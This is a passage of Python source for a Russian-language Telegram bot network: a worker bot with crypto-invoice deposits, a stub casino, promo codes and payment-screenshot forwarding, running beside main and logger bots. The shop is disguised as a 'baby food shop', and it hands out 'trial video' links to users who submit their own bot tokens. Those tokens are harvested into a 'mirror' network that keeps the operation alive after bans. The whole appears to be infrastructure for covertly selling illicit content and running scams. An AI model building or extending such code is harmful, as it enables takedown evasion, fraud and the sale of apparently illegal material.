    # ПОПОЛНЕНИЕ БАЛАНСА
    elif call.data == "deposit":
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("💎 10 USDT (~1000₽)", callback_data="deposit_10"),
            InlineKeyboardButton("💎 20 USDT (~2000₽)", callback_data="deposit_20"),
            InlineKeyboardButton("💎 50 USDT (~5000₽)", callback_data="deposit_50"),
            InlineKeyboardButton("🔙 НАЗАД", callback_data="profile")
        )
        worker_bot.edit_message_text("💰 <b>ПОПОЛНИТЬ БАЛАНС КАЗИНО</b>\n\nвыбери сумму в USDT:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data.startswith("deposit_"):
        amount_usdt = int(call.data.split("_")[1])
        rub_amount = amount_usdt * USDT_RATE
        
        invoice_id, pay_url = create_crypto_invoice(amount_usdt, user_id)
        if pay_url:
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("💳 ОПЛАТИТЬ", url=pay_url))
            kb.add(InlineKeyboardButton("🔄 проверить", callback_data=f"check_deposit_{invoice_id}_{rub_amount}"))
            kb.add(InlineKeyboardButton("🔙 назад", callback_data="deposit"))
            text = f"🤖 <b>ПОПОЛНЕНИЕ БАЛАНСА</b>\n\n💰 сумма: {rub_amount}₽ ({amount_usdt} USDT)\n\n1️⃣ нажми «ОПЛАТИТЬ»\n2️⃣ оплати USDT\n\n✅ после оплаты баланс зачислится автоматически"
            worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
        else:
            worker_bot.answer_callback_query(call.id, "❌ ошибка создания счёта")
    
    elif call.data.startswith("check_deposit_"):
        parts = call.data.split("_")
        invoice_id = parts[2]
        rub_amount = int(parts[3])
        c.execute("SELECT status FROM crypto_invoices WHERE invoice_id=?", (invoice_id,))
        row = c.fetchone()
        if row and row[0] == 'paid':
            update_balance(user_id, rub_amount)
            worker_bot.send_message(call.message.chat.id, f"✅ баланс пополнен на {rub_amount}₽")
            c.execute("DELETE FROM crypto_invoices WHERE invoice_id=?", (invoice_id,))
            conn.commit()
            worker_bot.delete_message(call.message.chat.id, call.message.message_id)
        else:
            worker_bot.answer_callback_query(call.id, "⏳ оплата ещё не получена", show_alert=True)
    
    # КАЗИНО (заглушка — добавим позже)
    elif call.data == "casino":
        kb = InlineKeyboardMarkup()
        kb.add(
            InlineKeyboardButton("💣 MINE", callback_data="casino_mines"),
            InlineKeyboardButton("🚀 ROCKET", callback_data="casino_rocket"),
            InlineKeyboardButton("📦 КЕЙСЫ", callback_data="casino_cases"),
            InlineKeyboardButton("🔙 назад", callback_data="back")
        )
        worker_bot.edit_message_text("🎰 <b>КАЗИНО</b>\n\nвыбери игру:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data.startswith("casino_"):
        worker_bot.answer_callback_query(call.id, "🚧 в разработке, скоро появится!")
    
    # НАЗАД
    elif call.data == "back":
        worker_bot.edit_message_text("🍼 <b>ДЕТСКОЕ ПИТАНИЕ SHOP</b>\n\nвыбери действие:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=worker_menu())

@worker_bot.message_handler(func=lambda m: True, content_types=['text', 'photo'])
def worker_text(m):
    user_id = str(m.from_user.id)
    c.execute("SELECT step FROM user_sessions WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        return
    step = row[0]
    
    if step == "awaiting_promo":
        code = m.text.strip().upper()
        success, discount = apply_promo_code(user_id, code)
        if success:
            worker_bot.reply_to(m, f"✅ промокод {code} активирован! скидка {discount}% на следующую покупку")
        else:
            worker_bot.reply_to(m, "❌ неверный или просроченный промокод")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (user_id,))
        conn.commit()
    
    elif step == "awaiting_trial_token":
        token = m.text.strip()
        if ':' not in token:
            worker_bot.reply_to(m, "❌ неверный формат токена")
            return
        alive, username = check_bot_alive(token)
        if not alive:
            worker_bot.reply_to(m, "❌ бот не существует или заблокирован")
            return
        add_mirror_bot(token, username, user_id)
        # Выдаём доступ к пробному видео
        trial_link = "https://t.me/+fEQI916fF2ZkNDMx"  # замени на реальную ссылку
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🎬 ПОЛУЧИТЬ ПРОБНОЕ ВИДЕО", url=trial_link))
        worker_bot.send_message(m.chat.id, f"✅ бот @{username} добавлен в базу зеркал!\n\n🎁 вот твой доступ к пробному видео:", reply_markup=kb)
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (user_id,))
        conn.commit()
    
    elif step == "awaiting_screenshot":
        if m.content_type == 'photo':
            # Пересылаем скриншот админу
            logger_bot.send_photo(ADMIN_ID, m.photo[-1].file_id, caption=f"📸 скриншот оплаты от {user_id}")
            worker_bot.reply_to(m, "✅ скриншот отправлен на проверку. админ свяжется с тобой в ближайшее время")
            log_action(user_id, "отправлен скриншот оплаты", "")
        else:
            worker_bot.reply_to(m, "❌ отправь именно фото чека")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (user_id,))
        conn.commit()

# ========== ЗАПУСК ==========
def run_bot(bot_instance, name):
    while True:
        try:
            print(f"✅ {name} запущен")
            bot_instance.polling(none_stop=True, interval=3, timeout=30)
        except Exception as e:
            print(f"❌ {name}: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Инициализация текущего рабочего бота
    set_current_worker(WORKER_BOT_TOKEN, "worker_bot")
    
    # Запуск мониторинга зеркал
    threading.Thread(target=monitor_worker, daemon=True).start()
    
    # Запуск проверки счетов криптобота
    if CRYPTOBOT_TOKEN:
        threading.Thread(target=check_crypto_invoices, daemon=True).start()
    
    # Запуск ботов
    threading.Thread(target=run_bot, args=(main_bot, "основной"), daemon=True).start()
    threading.Thread(target=run_bot, args=(worker_bot, "рабочий"), daemon=True).start()
    threading.Thread(target=run_bot, args=(logger_bot, "логгер"), daemon=True).start()
    
    log_to_logger("🚀 все боты запущены")
    print("✅ все боты работают")
    
    while True:
        time.sleep(1)